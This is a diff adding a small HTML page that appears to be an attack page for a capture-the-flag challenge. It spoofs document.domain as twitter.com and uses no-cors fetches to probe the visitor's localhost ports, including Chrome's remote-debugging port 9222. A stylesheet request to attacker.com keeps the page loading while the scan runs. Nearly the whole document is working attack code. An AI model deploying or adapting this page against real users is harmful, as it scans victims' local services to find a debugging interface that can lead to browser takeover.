@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width" />
+        <title>Get port</title>
+    </head>
+    <body>
+        <pre id="urls">Hi</pre>
+        <script>
+						Object.defineProperty(document, 'domain', {
+						  value: 'twitter.com'
+						});
+
+						ports = [1200,1234,8876,9222];// still we are using default port 9222, players can't say, it's a guess challenge :)  
+            for (port of ports) {
+                const url = `http://127.0.0.1:${port}`
+                fetch(url, {mode: 'no-cors'}).then(res => {
+                    urls.textContent += `\n${url}`
+                })
+            }
+        </script>
+
+        <!-- Delay page load to keep script running -->
+        <link rel="stylesheet" href="http://attacker.com/script_that_wont_respond_like_wait_for_5_or_more_seconds">
+    </body>
+</html>
